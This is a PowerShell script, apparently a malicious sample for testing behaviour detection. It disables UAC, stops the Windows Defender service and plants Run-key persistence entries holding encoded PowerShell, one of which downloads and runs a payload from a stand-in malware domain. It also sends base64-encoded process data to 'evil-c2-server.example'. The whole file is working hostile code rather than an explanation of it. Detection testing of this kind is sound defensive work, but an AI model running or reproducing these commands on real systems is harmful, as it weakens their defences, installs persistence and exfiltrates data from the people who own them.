# Child script with known malicious patterns
$ErrorActionPreference = 'SilentlyContinue'

# Attempt to modify system security
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousStartup" -Value "cmd.exe /c powershell.exe -enc JABwAGEAdABoACAAPQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAAiAA=="
} catch {}

# Execute parent script for relationship detection
$parentScript = "malicious_parent.ps1"
if (Test-Path $parentScript) {
    & .\$parentScript
}

# Known malicious behaviors
Start-Process "cmd.exe" "/c net stop 'Windows Defender Service'"
Invoke-Expression "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /v BadService /t REG_SZ /d 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAtAGQAbwBtAGEAaQBuAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA' /f"

# Persistence and data exfiltration simulation
$exfilData = Get-Process | ConvertTo-Json
$encoder = [System.Text.Encoding]::UTF8
$encodedData = [Convert]::ToBase64String($encoder.GetBytes($exfilData))
try {
    Invoke-WebRequest -Uri "http://evil-c2-server.example/exfil" -Method POST -Body $encodedData
} catch {}
